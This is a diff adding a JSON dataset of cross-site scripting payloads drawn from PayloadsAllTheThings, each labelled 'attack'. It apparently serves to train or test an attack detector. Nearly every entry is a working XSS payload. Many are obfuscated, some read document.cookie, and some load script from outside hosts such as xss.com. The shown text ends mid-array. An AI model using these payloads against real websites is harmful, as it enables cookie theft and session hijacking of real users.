@@ -1,0 +1,3050 @@
+[
+  {
+    "text": "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<<scr\\0ipt/src=http://xss.com/xss.js></script",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' onmouseover=alert(/Black.Spook/)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><iframe%20src=\"http://google.com\"%%203E",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'<script>window.onload=function(){document.forms[0].message.value='1';}</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "x”</title><img src%3dx onerror%3dalert(1)>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(document.head.innerHTML.substr(146,20));</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(document.head.childNodes[3].text)</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%22)};document.body.appendChild(x);</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\/script>%22)};document.body.appendChild(x);</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=/ onload=eval(unescape(this.name.replace(/\\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script for=document event=onreadystatechange>getElementById('safe123').click()</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\/script%26gt;\\%26quot;%26quot;) autofocus></textarea>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a target=\"x\" href=\"xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a target=\"x\" href=\"xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a target=\"x\" href=\"xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a target=\"x\" href=\"xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> ?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<var onmouseover=\"prompt(1)\">On Mouse Over</var>?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<%<!--'%><script>alert(1);</script -->",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script src=\"data:text/javascript,alert(1)\"></script>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe/src \\/\\/onload = prompt(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe/onreadystatechange=alert(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<input value=<><iframe/src=javascript:confirm(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<input type=\"text\" value=``<div/onmouseover='alert(1)'>X</div>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "http://www.<script>alert(1)</script .com",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><script ?>alert(1)",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=`xx:xx`onerror=alert(1)>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>?",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg contentScriptType=text/vbs><script>MsgBox+1",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>",
+    "label": "attack",
+    "category": "pat-JHADDIX_XSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
